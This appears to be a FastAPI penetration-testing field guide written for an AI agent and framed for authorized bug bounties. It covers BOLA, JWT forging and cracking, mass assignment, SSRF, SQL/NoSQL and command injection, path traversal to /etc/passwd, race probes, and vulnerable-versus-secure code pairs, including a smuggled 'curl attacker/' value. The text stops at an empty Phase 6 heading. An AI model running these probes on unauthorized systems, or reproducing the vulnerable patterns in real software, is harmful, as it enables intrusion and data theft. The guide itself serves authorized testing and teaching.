---
technology: FastAPI
kind: bug-bounty-methodology
audience: ai-agent
version: 0.4
source: "imported from the field guide fastapi-pentest-methodology v0.4 (2026-11-12)"
provenance: "imported author methodology (byte-intact, v0.4); supplements 2026-11-13 verified against primary advisories; companion overview [[fastapi]]"
---

Companion pages: [[fastapi|FastAPI overview]] — the human introduction. Tool notes live in the separate tools vault (Vaults/tools); Appendix C maps this methodology onto them.

---

# FastAPI Penetration Testing Methodology

**A bug hunter's field guide — v0.4 (2026-11-12)**

**In scope:** FastAPI applications and their full runtime stack — FastAPI itself, Starlette (middleware, routing, multipart parsing), Pydantic (validation and serialization), Uvicorn (ASGI server), python-multipart, and the common companion libraries (SQLAlchemy/SQLModel, Beanie/Motor, httpx, python-jose/PyJWT, Jinja2).

**Out of scope:** Django, Flask, and every other Python web framework. Nothing in this document applies the assumptions of those frameworks.

**Audience:** bug bounty hunters and red teamers operating under an authorized program. Everything here assumes you have written permission, you respect the program's rules of engagement, and you avoid destructive or high-volume tests (parallel request floods, parser memory exhaustion, credential stuffing at scale) unless they are explicitly permitted and monitored. Every technique below is single-request, low-volume, and evidence-oriented.

---

## 1. The FastAPI security model in one page

FastAPI gives its users a development experience that feels safe: typed request models, dependency injection, generated OpenAPI, OAuth2 helpers, Starlette middleware. None of that removes the need for authorization design, and that is where the bugs live. The framework's guarantees stop exactly where application logic begins:

- **Pydantic validates shape and type. It does not decide authority.** A request body can pass validation perfectly and still be a request for an object the caller does not own.
- **A bearer token proves possession. It does not prove scope, tenant, role, or relationship to the requested object.**
- **The OpenAPI schema documents the API. It does not guarantee every documented route should be visible, and it does not list routes the developer hid.**
- **CORS controls browser cross-origin behavior. It does not stop curl, mobile apps, or server-to-server callers.**
- **The stack is layered: Uvicorn → Starlette → FastAPI → your routes.** A vulnerability or misconfiguration in any layer (or a disagreement between layers about headers, paths, or hosts) is a finding for a FastAPI target.

The single most productive sentence in this methodology: **authentication is not authorization, and authorization is not ownership.** FastAPI makes authentication a one-liner. Ownership checks are always hand-written, always per-route, and therefore always forgotten somewhere.

### Where the money is (triage priority)

| Priority | Class | Typical FastAPI shape | Typical bounty severity |
|---|---|---|---|
| 1 | BOLA (OWASP API1:2023) | Object ID in path/query/body; handler never checks tenant/user — also via GraphQL resolvers | High–Critical |
| 2 | Mass assignment via Pydantic | Update model declares privileged fields (`role`, `tenant_id`, `is_admin`) | Critical |
| 3 | Response over-exposure (API3) | Whole ORM object dumped; `password_hash`, `tenant_id`, internal flags in the body | Medium–High |
| 4 | JWT/token flaws | Unpinned algorithms, no expiry check, python-jose CVEs, weak HMAC secret, refresh rotation gaps | High–Critical |
| 5 | BFLA (function-level) | Admin router or route missing its guard dependency | High |
| 6 | SSRF in fetchers and task workers | Webhooks, URL previews, importers, BackgroundTasks/Celery | High |
| 7 | SQL/NoSQL injection | `text()` with f-strings, dynamic ORDER BY, Mongo operators | High |
| 8 | CORS with credentials | Reflected origin + `allow_credentials=True` | Medium |
| 9 | Path/host trust | `request.url.path` gates, missing `TrustedHostMiddleware`, `X-Forwarded-*` | Medium |
| 10 | OpenAPI/docs overexposure | `/docs`, `/redoc`, `/openapi.json` in production | Low–Info |
| 11 | Verbose errors / info disclosure | Stack traces in 500s, model internals in 422s | Low |

Phases 0–2 build your target map; Phases 3–5 are where most payouts come from; Phases 6–7 round out coverage. Work them in order on a fresh target.

---

## Phase 0 — Recon and fingerprinting

Goal: confirm the target is FastAPI (or a stack that behaves like it), and collect the baseline responses you will diff against later.

### 0.1 Fingerprints that say "FastAPI"

```bash
# Default FastAPI 404 — this JSON body is the strongest single hint
curl -i https://api.example.com/definitely-not-a-route
# -> 404 {"detail":"Not Found"}

# Default validation error — only FastAPI/Pydantic produces this shape
curl -i https://api.example.com/invoices -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}'
# -> 422 {"detail":[{"type":"missing","loc":["body","payload"],"msg":"Field required"}]}

# Documentation endpoints (enabled by default)
curl -i https://api.example.com/docs        # Swagger UI
curl -i https://api.example.com/redoc       # ReDoc
curl -i https://api.example.com/openapi.json
```

Supporting signals: `Server: uvicorn` in responses (Uvicorn's `server_header` is on unless disabled); Swagger UI asset versions referenced in the `/docs` HTML; a 307 redirect when you add or remove a trailing slash (Starlette's `redirect_slashes` behavior).

A `404 {"detail":"Not Found"}` on an unknown route plus a `422` with `loc/msg/type` on a bad body is close to conclusive. Record both responses verbatim — they are your diff baseline.

### 0.2 Version and stack hints

FastAPI does not stamp its version into responses. Infer the stack from: the `/docs` HTML (Swagger UI version), OpenAPI `info` fields developers often fill with real names, error pages, and behavior (see Phase 7 for CVE matching). If the program's scope includes a repo, CI config, or Dockerfile, dependency pins are fair game and beat fingerprinting. When source is in scope, go one step further: reconcile what the wire shows against what is actually mounted — grep for `include_in_schema=False`, routers imported but never passed to `include_router()`, environment-gated debug routes. The gap between the source and the schema is where forgotten endpoints live.

### 0.3 First 15 minutes checklist

```bash
# Security headers present?
curl -sI https://api.example.com/ | grep -iE \
  'strict-transport-security|content-security-policy|x-frame-options|x-content-type-options|referrer-policy'

# Documentation exposed in production?
for p in docs redoc openapi.json; do
  curl -s -o /dev/null -w "%{http_code} $p\n" https://api.example.com/$p
done
```

Exposed docs are not automatically a bounty — but they hand you the complete route list, every Pydantic model, and every declared auth scheme, which is most of Phase 1 done for you.

---

## Phase 1 — Attack surface mapping from OpenAPI

Goal: turn the schema (or brute force, if it is hidden) into a table of `endpoint × auth requirement × object-id parameter`. That table is your BOLA candidate list.

### 1.1 Mine `openapi.json`

```bash
curl -s https://api.example.com/openapi.json -o openapi.json

# Every path + method
jq -r '.paths | to_entries[] | .key as $p | .value | keys[] | "\(.|ascii_upcase) \($p)"' openapi.json

# Every declared security scheme — tokenUrl is a free auth-endpoint map
jq '.components.securitySchemes' openapi.json

# Every parameter that looks like an object reference (BOLA candidates)
jq -r '.paths | to_entries[] | .key as $p | .value | to_entries[] | .key as $m |
  (.value.parameters // [])[]? | select(.name | test("id|uuid|key|ref"; "i")) |
  "\($m|ascii_upcase) \($p) -> \(.name) [\(in)]"' openapi.json
```

Extract four things: **routes**, **parameters that carry object references**, **Pydantic schemas** (field names are your mass-assignment candidate list — any model with `role`, `is_admin`, `tenant_id`, `status` on a mutable endpoint), and **securitySchemes** (the `tokenUrl` of an `OAuth2PasswordBearer` scheme is the login endpoint, handed to you for free). Then snapshot `openapi.json` on every visit: diffing consecutive snapshots (`diff`, `jq`, or oasdiff) surfaces newly shipped endpoints before anyone announces them, and new routes are the freshest, least-reviewed code on the target.

### 1.2 Hunt the routes that are not in the schema

FastAPI lets developers hide routes from the schema:

```python
# What defenders do — and why you cannot rely on openapi.json alone
@app.post("/internal/reindex", include_in_schema=False)
async def reindex(): ...
```

Hidden routes still route requests; they are just undocumented. Brute force with an API-focused wordlist:

```bash
git clone https://github.com/danielmiessler/SecLists
ffuf -w SecLists/Discovery/Web-Content/api/angles.txt \
     -u https://api.example.com/FUZZ \
     -mc all -fc 404 -ac
```

Diff every non-404 against the `{"detail":"Not Found"}` baseline from Phase 0. FastAPI route naming is predictable (`/items/{id}`, `/users/me`, `/admin/...`, `/internal/...`), so also probe the prefixes: `admin`, `internal`, `debug`, `jobs`, `metrics`, `health`, `backup`, `export`.

### 1.3 Auth flow mapping

From the securitySchemes, determine: where tokens come from (`tokenUrl`), where they are sent (`Authorization: Bearer` vs `api_key` header vs cookie), what scopes are declared, and whether WebSocket routes exist (check `jq '.paths | keys[] | select(test("ws|socket"; "i"))' openapi.json` — and if WebSockets are in scope, test auth on the handshake; query-string tokens on WS are a common anti-pattern).

**Deliverable from Phase 1:** a table like the one below. Every row with an object reference and a state-changing verb goes to the top of your Phase 3 queue.

| Endpoint | Method | Auth declared? | Object ref param | Notes |
|---|---|---|---|---|
| `/invoices/{invoice_id}` | GET | bearer | `invoice_id` (path) | BOLA candidate |
| `/users/me` PATCH | PATCH | bearer | none (implicit) | check mass assignment |
| `/admin/reindex` | POST | **?** | none | hidden from schema — BFLA candidate |

### 1.4 GraphQL mounted alongside REST

FastAPI apps frequently mount Strawberry or Ariadne at `/graphql` next to their REST routes — same process, same database, usually the same developers. The critical fact: **GraphQL resolvers do not inherit FastAPI route dependencies.** Authentication and authorization are hand-written per resolver, so GraphQL is where guarded REST APIs leak. Detect it, then treat it as a parallel surface for Phases 2–4:

```bash
# Find the endpoint and its IDEs
for p in graphql graphiql altair; do
  curl -s -o /dev/null -w "%{http_code} /$p\n" https://api.example.com/$p
done

# Introspection: the schema dump is the GraphQL openapi.json
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

The tests, in payout order: **BOLA through resolvers** — repeat the Phase 3 two-account ID swap through GraphQL (`query { invoice(id: "inv_B2002") { total owner { email } } }`), because resolver-level ownership checks are missed even more often than route-level ones; **field-level exposure** — request nested fields the REST API never returns (`user { passwordHash tenantId }`) and see what comes back; **introspection in production** — information disclosure, and a free map of every resolver to test; **depth/complexity limits** — one deeply nested query that measurably stalls the worker; **batching and aliasing** — an array of queries, or one query with hundreds of aliases, doing in a single request what the rate limiter was supposed to prevent.

---

## Phase 2 — Authentication testing

Goal: break the token, not the password. Login endpoints matter (user enumeration, missing rate limits), but the JWT layer is where FastAPI apps repeatedly fail.

### 2.1 The token attack matrix

Run every token through every row:

| Test | Request | Secure behavior | Finding |
|---|---|---|---|
| No token | plain request | 401/403 | 200 = broken function-level authn |
| Tampered signature | flip one char of the signature | 401 | 200 = signature not verified |
| `alg: none` | strip signature, set alg to none | 401 | 200 = classic none-alg acceptance |
| Alg confusion | re-sign token as HS256 using the public key as the secret | 401 | 200 = RS/HS confusion |
| Weak HMAC secret | crack the HS256 secret | — | crackable secret = forgeable tokens |
| Expired token | old token, valid signature | 401 | 200 = expiry not enforced |
| Wrong audience/issuer | valid signature, foreign aud/iss | 401 | 200 = claims not checked |

Tooling, in the order a hunter usually reaches for it:

```bash
# Forge and mutate tokens
python3 jwt_tool.py $TOKEN -X a      # alg:none
python3 jwt_tool.py $TOKEN -X k      # key confusion (RS256 -> HS256)

# Crack weak HS256 secrets offline (mode 16500 = JWT)
echo "$TOKEN" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### 2.2 Known-bad library versions

Two verified CVE families to check for in FastAPI targets:

- **python-jose** — CVE-2024-33663 (algorithm confusion with ECDSA/DER key formats; NVD lists it as through 3.3.0, and follow-up analysis found the fix incomplete through 3.5.0) and CVE-2024-33664 (a "JWT bomb": crafted JWE with high compression ratio causes resource exhaustion during `decode`; fixed in 3.4.0, CVSS 5.3). If you can make the server error or stall on a single crafted token, that is a report.
- **Starlette** — see Phase 7's CVE table; these are FastAPI problems too, since FastAPI apps are Starlette apps.

### 2.3 Login endpoint checks

```bash
# User enumeration via response body / status differentiation
curl -s -o /dev/null -w '%{http_code} %{time_total}\n' https://api.example.com/auth/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=alice&password=wrong1'
curl -s -o /dev/null -w '%{http_code} %{time_total}\n' https://api.example.com/auth/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=no-such-user-xyz&password=wrong1'
```

Meaningful differences in status, body, or timing between "user exists" and "user doesn't" are enumeration findings. No rate limit on `tokenUrl` (try a handful of requests, never a flood) is worth noting in reports as an amplifier. If the app authenticates browser clients with cookies (`SessionMiddleware`), CSRF becomes in-scope for state-changing routes — check whether any anti-CSRF token is required at all. One defensive pattern to know: FastAPI's reference login code verifies against a dummy password hash when the username doesn't exist, deliberately equalizing timing — if status, body, *and* timing are identical, timing-based enumeration is dead on that endpoint, so pivot to behavioral differentiators (password-reset flow, registration) instead.

### 2.4 Code pairs — token verification

```python
# VULNERABLE — accepts attacker-chosen algorithm, never checks expiry
from jose import jwt
payload = jwt.decode(token, SECRET_KEY)   # no algorithms=[...]; exp ignored

# SECURE — pinned algorithm, verified claims, explicit issuer/audience
import jwt as pyjwt
payload = pyjwt.decode(
    token,
    PUBLIC_KEY,
    algorithms=["RS256"],               # never take this from the header
    audience="api.example.com",
    issuer="https://auth.example.com",
    options={"require": ["exp", "iat", "sub"]},
)
```

### 2.5 Refresh tokens and token placement

Two cheap checks with outsized payouts:

**Rotation.** Redeem a refresh token, receive a new one, then replay the *old* one. Secure behavior: the replay fails with 401 *and* the whole token family is revoked — a reused refresh token is the signature of theft, so killing the family is the point of rotation. Findings: an old refresh token still mints access tokens (rotation is cosmetic), or revocation does not cascade (the family survives).

```bash
curl -s https://api.example.com/auth/refresh -H 'Content-Type: application/json' \
  -d '{"refresh_token": "'"$OLD_REFRESH"'"}'   # replay after already rotating once
```

**Token placement.** Grep captured traffic and frontend JS for tokens in URLs — `?token=`, `?access_token=`, `/invite/<token>` in paths. Tokens in URLs leak into proxy logs, server logs, browser history, and `Referer` headers. It is endemic in WebSocket auth (`ws://host/ws?token=...`, because browsers cannot set headers on a WS handshake); if you see it, note every other place that token value appears.

---

## Phase 3 — Authorization: BOLA, BFLA, mass assignment, and over-exposure

Goal: the money phase. Every object-reference endpoint from Phase 1 gets tested with two accounts.

### 3.1 The BOLA method (two accounts, one script)

Register two accounts (or use two tenants if the program allows). Then:

```bash
curl -s https://api.example.com/invoices/inv_A1001 -H "Authorization: Bearer $TOKEN_A"  # own object
curl -s https://api.example.com/invoices/inv_B2002 -H "Authorization: Bearer $TOKEN_A"  # B's object, A's token
```

If both return 200 with bodies, that is BOLA. Repeat systematically:

```python
import os, httpx

BASE = "https://api.example.com"
HEADERS = {
    "A": {"Authorization": f"Bearer {os.environ['TOKEN_A']}"},
    "B": {"Authorization": f"Bearer {os.environ['TOKEN_B']}"},
}
IDS = ["inv_A1001", "inv_B2002", "inv_C3003"]   # A-owned, B-owned, unknown

for i in IDS:
    ra = httpx.get(f"{BASE}/invoices/{i}", headers=HEADERS["A"])
    rb = httpx.get(f"{BASE}/invoices/{i}", headers=HEADERS["B"])
    if ra.status_code == 200 and rb.status_code == 200 and ra.json() == rb.json():
        print(f"[!] {i}: readable by both accounts — BOLA")
```

Burp's Autorize extension automates the same idea passively; the manual script above keeps evidence tight and single-volume.

Where object references hide — test all of them, not just the path: query strings (`?account_id=`), request bodies (`{"tenant_id": "..."}` in a create/update payload), headers (`X-User-Id` — an anti-pattern that screams "the client decides identity"), and response bodies of *other* endpoints (an `/orders` listing that leaks `user_id`s you can then pivot to `/users/{user_id}/tokens`). ID format does not matter: sequential ints are enumerable, but UUIDs only stop enumeration — they do not stop a two-account swap. Also note the 404/403 side channel: if foreign objects return 403 and your own tenant's non-existent objects return 404, you can enumerate object existence inside your tenant.

### 3.2 Code pairs — object-level authorization

```python
# VULNERABLE — authenticated, loads any invoice for any caller
@app.get("/invoices/{invoice_id}")
async def get_invoice(invoice_id: str, user: User = Depends(get_current_user)):
    return await db.invoices.get(invoice_id)

# SECURE — ownership checked inside the handler, foreign objects 404
@app.get("/invoices/{invoice_id}")
async def get_invoice(invoice_id: str, user: User = Depends(get_current_user)):
    invoice = await db.invoices.get(invoice_id)
    if not invoice or invoice.tenant_id != user.tenant_id:
        raise HTTPException(status_code=404, detail="Invoice not found")
    if "billing:read" not in user.scopes:
        raise HTTPException(status_code=403, detail="Forbidden")
    return invoice
```

### 3.3 BFLA — function-level gaps

Test every admin-flavored route from Phase 1 with a *regular* token. FastAPI's failure mode is structural: guards attach per-route or per-router, so a new route added to a router without the dependency is silently open. Also test HTTP verb mismatches: a route protected on GET but exposed on PUT/PATCH/DELETE, and `X-HTTP-Method-Override` if the app honors it.

Audit the dependency *chain*, not just the route list. Guards attach at app, router, and route level, and they compose additively — `dependencies=[...]` on a route *adds to* the router's guards, never replaces them. The failure modes are structural: a route declared directly on `app` while its siblings live on a guarded `APIRouter`; a router mounted before its guard dependency was added; a WebSocket route that never picks up the HTTP middleware chain; a dependency whose `HTTPException` is swallowed by a custom exception handler. For every sensitive route, ask what the *effective* stack of `Security()`/`Depends()` sits between the request and the handler body — enumerate `app.routes` and read each route's `dependencies` rather than trusting the file layout.

### 3.4 Mass assignment via Pydantic models

Pydantic ignores undeclared fields by default, so the bug appears when a developer *declares* privileged fields on a user-editable model:

```python
# VULNERABLE — privileged fields on a user-editable model
class UserUpdate(BaseModel):
    name: str
    email: EmailStr
    role: str        # attacker sends role="admin"
    tenant_id: str    # attacker hops tenants

@app.patch("/users/{user_id}")
async def update_user(user_id: str, patch: UserUpdate,
                      user: User = Depends(get_current_user)):
    await db.users.update(user_id, patch.model_dump())   # no /users/me, either: BOLA too

# SECURE — server derives identity; input model carries only editable fields
class UserUpdate(BaseModel):
    name: str
    email: EmailStr
    model_config = ConfigDict(extra="forbid")   # fail closed on unknown fields

@app.patch("/users/me")
async def update_me(patch: UserUpdate, user: User = Depends(get_current_user)):
    await db.users.update(user.user_id, patch.model_dump())
```

Test by sending the privileged fields and observing: a 200 followed by `role` actually changing is a Critical. A 422 on unknown fields (`extra="forbid"`) is the secure behavior.

### 3.5 Property-level authorization and excessive data exposure (API3)

The read-side sibling of mass assignment: the handler returns the whole ORM object when the client should see a subset of fields. OWASP calls this API3, and it is under-reported in FastAPI apps because the responses *look* correct — same route, same 200, just more fields than the client deserves.

```python
# VULNERABLE — full model dump: password_hash, tenant_id, internal flags ship to the client
@app.get("/users/me")
async def me(user: User = Depends(get_current_user)):
    return user.model_dump()

# SECURE — response_model is the field allowlist
class UserOut(BaseModel):
    user_id: str
    email: EmailStr
    display_name: str

@app.get("/users/me", response_model=UserOut)
async def me(user: User = Depends(get_current_user)):
    return user
```

Hunt it by diffing the live response against the documented schema:

```bash
# fields present in the response but absent from openapi.json (adjust for $ref schemas)
comm -13 \
  <(jq -r '.paths["/users/me"].get.responses["200"].content["application/json"].schema.properties // {} | keys[]' openapi.json | sort) \
  <(curl -s https://api.example.com/users/me -H "Authorization: Bearer $TOKEN" | jq -r 'keys[]' | sort)
```

Anything undocumented — `password_hash`, `tenant_id`, `is_internal`, another user's object nested inside the response — is a finding. Severity compounds with BOLA: an ID swap that returns only a display name is Medium; the same swap returning `tenant_id`, email, and `password_hash` is High.

### 3.6 Path-based middleware gates (the BadHost class)

Never trust an authorization decision made from a reconstructed URL. Starlette's `request.url.path` can diverge from the path the router matched when a malformed `Host` header reaches the app (CVE-2026-48710, "BadHost", fixed in Starlette 1.0.1 — see Phase 7). Probe any app that gates by path in middleware:

```bash
# Does a malformed Host change what the middleware sees vs. what routes?
curl -i https://api.example.com/admin/reports -H 'Host: ..'
curl -i https://api.example.com//admin/reports        # double slash
curl -i --path-as-is https://api.example.com/admin/../admin/reports
curl -i https://api.example.com/%61dmin/reports        # percent-encoded 'a'
```

```python
# FRAGILE — authz decided from a mutable URL view
@app.middleware("http")
async def path_gate(request: Request, call_next):
    if request.url.path.startswith("/admin"):
        user = await authenticate(request)
        if not user or not user.is_admin:
            return JSONResponse({"detail": "Forbidden"}, status_code=403)
    return await call_next(request)

# ROBUST — the guard lives on the router, not on a URL reconstruction
admin_router = APIRouter(prefix="/admin", dependencies=[Security(require_admin)])

@admin_router.get("/reports")
async def admin_reports():
    return await load_admin_reports()
```

### 3.7 Race conditions on state-changing endpoints

FastAPI's async concurrency makes check-then-act bugs easy to create and cheap to test: two requests in flight at the same instant can both pass the authorization/balance check before either executes the state change. High-value targets: coupon and promo redemptions, referral bonuses, voting and rating, follow/invite limits, "once per user" anything, and withdrawal or credit endpoints.

```bash
# a handful of parallel requests, not a flood — 8 is enough to demonstrate a race
seq 1 8 | xargs -P 8 -I{} curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  https://api.example.com/coupons/WELCOME/redeem \
  -H "Authorization: Bearer $TOKEN"
```

Secure behavior: exactly one `200` and seven `409`/`422`. The finding: multiple `200`s, or a counter/balance that moved more than once. When you report it, recommend the fix at the storage layer — a unique constraint, `SELECT ... FOR UPDATE`, or an idempotency key — because the app-level check-then-act pattern is what produced the bug.

### 3.8 Coverage matrix

| Test | Request | Expected (secure) | Signal |
|---|---|---|---|
| No auth on object route | no token | 401 | 200 = missing function authn |
| A's token, B's object | swap IDs | 404 | 200 + body = BOLA |
| User token on admin route | regular token | 403 | 200 = BFLA |
| Privileged field in PATCH | `role:"admin"` | 422 unknown field | 200 + changed = mass assignment |
| Malformed Host + admin path | `Host: ..` | 403 | 200 = path-gate bypass |
| Verb swap on protected route | GET→PUT/DELETE | 405 or authz enforced | state change = verb gap |
| Redeem twice in parallel | 8 parallel POSTs | one 200, rest 409 | multiple 200s = race |
| Old refresh token replay | re-use rotated token | 401 + family revoked | new access token = rotation gap |
| Undocumented response fields | diff body vs openapi.json | schema fields only | password_hash/tenant_id = API3 |
| Task ID swap | B's task_id, A's token | 404 | 200 + result = task BOLA |
| GraphQL introspection | POST `__schema` query | disabled | full schema dump |

---

## Phase 4 — Injection and dangerous sinks

Goal: find where user input reaches an interpreter. Pydantic validation is not sanitization — a field can be a perfectly valid `str` and still be a payload at the sink.

### 4.1 SQL via SQLAlchemy/SQLModel

The ORM parameterizes values. Injection survives in *structure*: dynamic ORDER BY, f-string `text()`, JSON-to-query translators, admin search.

```python
# VULNERABLE — user controls SQL structure, not just values
@app.get("/invoices")
async def list_invoices(sort: str = "created_at", direction: str = "desc",
                        user: User = Depends(get_current_user)):
    q = text(f"SELECT id, total FROM invoices ORDER BY {sort} {direction}")
    return (await db.execute(q)).fetchall()

# SECURE — user choices map to a developer-owned allowlist
ALLOWED_SORTS = {"created_at": "created_at", "total": "total", "status": "status"}
ALLOWED_DIRS = {"asc", "desc"}

@app.get("/invoices")
async def list_invoices(sort: str = "created_at", direction: str = "desc",
                        user: User = Depends(get_current_user)):
    col = ALLOWED_SORTS.get(sort)
    if col is None or direction not in ALLOWED_DIRS:
        raise HTTPException(status_code=422, detail="Invalid sort")
    q = text(f"SELECT id, total FROM invoices ORDER BY {col} {direction}")
    return (await db.execute(q)).fetchall()
```

Payloads for the vulnerable shape: `sort=total;--`, `sort=total,(SELECT(1))`, `sort=created_at desc--`, `direction=desc;SELECT`, unusual Unicode and `%00` truncation. Diff responses against the baseline; error text (`SQL syntax`) is a bonus.

### 4.2 NoSQL (Mongo/Beanie/Motor)

If schemas or responses smell document-shaped, try operator injection in filters: send `{"email": {"$ne": ""}}` or `{"$gt": ""}` where a scalar is expected, and `[$regex]` where object filters are built from user JSON.

### 4.3 Command injection and code execution sinks

FastAPI is the default framework for ML/AI services, which makes "user input reaches an interpreter" a first-class bug class: endpoints that run user snippets, load user-supplied models (`pickle.load` = arbitrary code execution), or shell out for transforms.

```python
# VULNERABLE — user-controlled string reaches a shell
@app.post("/render")
async def render(fmt: str):
    os.system(f"convert in.png out.{fmt}")          # fmt = "png; curl attacker/"

# SECURE — allowlist the switch, pass values as argv
ALLOWED_FMT = {"png", "jpg", "webp"}
@app.post("/render")
async def render(fmt: str):
    if fmt not in ALLOWED_FMT:
        raise HTTPException(status_code=422, detail="Unsupported format")
    subprocess.run(["convert", "in.png", f"out.{fmt}"], check=True)
```

Sinks to grep for in any accessible source: `os.system`, `shell=True`, `eval(`, `exec(`, `pickle.load`, `yaml.load` without `SafeLoader`, `render_template_string`. If the app returns HTML from Jinja2 templates with user data, try `{{7*7}}` and look for `49` (SSTI). And for AI-service targets specifically — FastAPI's home turf — check for exposed agent machinery: pydantic-ai's `Agent.to_web()` dev chat UI has a path-traversal CVE-2026-25640 that serves attacker JavaScript under the UI's origin (see 7.2), and its fetch/search tools carry their own SSRF history. Any interactive agent UI reachable in production is a finding candidate before you even test its tools.

### 4.4 SSRF in server-side fetchers

Webhooks, "import from URL", avatar/preview fetchers, PDF generators — anywhere the server takes a URL and calls it:

```python
# VULNERABLE — client controls the destination
@app.post("/webhooks")
async def create_webhook(url: HttpUrl, user: User = Depends(get_current_user)):
    async with httpx.AsyncClient() as client:
        await client.post(str(url), json={"event": "test"})

# SECURE — scheme+host allowlist, private ranges blocked, redirects inspected
from urllib.parse import urlparse
BLOCKED_HOSTS = ("localhost", "127.0.0.1", "169.254.169.254", "metadata")

@app.post("/webhooks")
async def create_webhook(url: HttpUrl, user: User = Depends(get_current_user)):
    p = urlparse(str(url))
    if p.scheme != "https" or any(h in p.hostname for h in BLOCKED_HOSTS):
        raise HTTPException(status_code=422, detail="URL not allowed")
    ...
```

Probe with canary or in-scope internal targets per the program rules — a single `https://169.254.169.254/` request whose response body echoes back is the PoC. Do not port-scan the internal network unless explicitly permitted.

### 4.5 Background tasks and Celery

`BackgroundTasks` and Celery run *after* the response is sent, which quietly removes two safety nets: the request's auth context is not re-checked, and "the response was 200" feels like validation. Three angles:

**Task-result endpoints are BOLA surfaces.** Polling routes like `/tasks/{task_id}` routinely skip ownership checks, and task IDs (Celery UUIDs, sequential job IDs) leak from other responses:

```python
# VULNERABLE — anyone who learns a task id reads its result
@app.get("/tasks/{task_id}")
async def task_status(task_id: str):
    return task_meta(task_id)

# SECURE — bound to the creator
@app.get("/tasks/{task_id}")
async def task_status(task_id: str, user: User = Depends(get_current_user)):
    task = await db.tasks.get(task_id)
    if not task or task.owner_id != user.user_id:
        raise HTTPException(status_code=404, detail="Not found")
    return task
```

**User input that flows into task functions.** Trace `background_tasks.add_task(fn, user_input)` and Celery `.delay(user_input)`: if the worker shells out, evaluates, or fetches a URL from that input, the 4.3–4.4 checks apply one hop away from HTTP. Celery with the `pickle` serializer and attacker-influenced arguments is an RCE primitive — report it immediately.

**Response/task races.** The handler answers 200, then the task executes later — permission checks evaluated at request time ("may this user export this?") can be stale by execution time. Flip the object's state between the response and the task execution, and see what the task still does.

---

## Phase 5 — Pydantic and parser edge cases

Goal: attack the validation layer itself and the multipart machinery beneath it.

### 5.1 Validation quirks worth probing

- **Type coercion:** `"true"` and `1` often coerce into bool/int fields — probe authz-adjacent flags (`is_active`, `page` sizes) where a string slips through where a number was expected.
- **NaN and Infinity:** Pydantic v2 accepts `NaN`, `Infinity`, and `-Infinity` on `float` fields by default (`allow_inf_nan` defaults to `True`) — and Python's JSON parser accepts these literals even though the JSON spec does not. NaN defeats every comparison (`price < 100000` is `False` for NaN), so downstream business checks can silently pass. Send `{"price": NaN}` and watch what the next `GET` says.
- **Arbitrary-precision ints:** a 10,000-digit integer is a valid Python `int` and passes validation — then overflows or stalls whatever integer-typed column, serializer, or downstream API receives it.
- **422 information leak:** validation errors echo `loc` paths and expected types — a map of internal model structure when `openapi.json` is hidden.
- **Regex constraints:** `pattern=` on fields can be a ReDoS primitive (catastrophic backtracking). One request that measurably stalls the worker is the evidence; do not parallelize.
- **Deep/huge bodies:** one very large or deeply nested JSON body (within program size rules) shows whether any body limit exists upstream.
- **`extra` configuration:** the Pydantic v2 setting is `model_config = ConfigDict(extra=...)` — `"ignore"` (the default) silently drops unknown fields, and `"allow"` keeps them in the model where they can ride into ORM updates (see 3.4). A 422 on unknown fields (`extra="forbid"`) is the only fail-closed setting.
- **Custom validators:** `@field_validator`/`@model_validator` logic lives in the model it decorates. The same data re-validated through a different model (input vs. output vs. an internal copy) skips those checks, and `mode="before"` validators that assume a shape can be handed a list or string where a dict was expected. When you find a validator in the source, ask which code paths *don't* pass through it.

### 5.2 Path traversal in file endpoints

```python
# VULNERABLE — the client picks the filesystem path
@app.get("/files/{filename:path}")
async def download(filename: str, user: User = Depends(get_current_user)):
    return FileResponse(f"/srv/uploads/{filename}")

# SECURE — DB id, ownership check, server-stored path
@app.get("/files/{file_id}")
async def download(file_id: str, user: User = Depends(get_current_user)):
    rec = await db.files.get(file_id)
    if not rec or rec.tenant_id != user.tenant_id:
        raise HTTPException(status_code=404, detail="Not found")
    return FileResponse(rec.storage_path, filename=rec.name, media_type=rec.media_type)
```

```bash
curl -s --path-as-is https://api.example.com/files/../../etc/passwd
curl -s --path-as-is https://api.example.com/files/%2e%2e%2f%2e%2e%2fetc/passwd
```

### 5.3 Uploads and multipart

For unrestricted upload: SVG carrying script, double extensions (`x.png.html`), content-type confusion. For the parser itself, the CVE history in 7.2 is the checklist — headline entry **CVE-2024-47874**: Starlette (hence FastAPI) before 0.40.0 buffers non-file form fields without a size limit, so a single request with a huge text field can drive memory toward OOM even behind a proxy with request-size limits (CVSS high). Its 2023 predecessor CVE-2023-30798 (< 0.25.0) reaches the same outcome via unlimited *field count*, and CVE-2024-24762 (python-multipart ≤ 0.0.6) is a single-header `Content-Type` ReDoS. Test with *one* request and watch, never a flood:

```bash
# single-request probe, ~5MB text field; observe latency/memory, then stop
curl -s https://api.example.com/feedback -F 'message=<./5mb.txt'
```

### 5.4 Event-loop starvation: blocking work in `async def` routes

FastAPI runs `async def` handlers directly on the event loop but parks plain `def` handlers in a threadpool. That asymmetry is a whole-application DoS primitive: one synchronous blocking call — a `requests` call, a sync database driver, `time.sleep`, or CPU-heavy work like PDF generation and image processing — inside an `async def` route freezes *every* concurrent connection for its duration, not just the caller's.

```python
# VULNERABLE — one slow sync call inside async def stalls all concurrent requests
@app.get("/report")
async def report(user: User = Depends(get_current_user)):
    return render_pdf_sync(user.id)        # blocks the event loop

# SECURE — plain def routes run in the threadpool; async routes use async I/O only
@app.get("/report")
def report(user: User = Depends(get_current_user)):
    return render_pdf_sync(user.id)
```

The probe is two requests: fire the slow endpoint, then time a trivial one while it runs.

```bash
curl -s -o /dev/null https://api.example.com/report -H "Authorization: Bearer $TOKEN" &
sleep 0.2 && curl -s -o /dev/null -w 'health during report: %{time_total}s\n' https://api.example.com/health
```

If `/health` — normally milliseconds — takes as long as the report, the loop is stalled, and a handful of concurrent slow requests is a full outage. The related state-corruption variant: one SQLAlchemy `AsyncSession` shared across concurrent tasks interleaves transactions and can return another request's rows — a data-integrity bug masquerading as a performance one.

---

## Phase 6 — CORS, Host header, and proxy trust

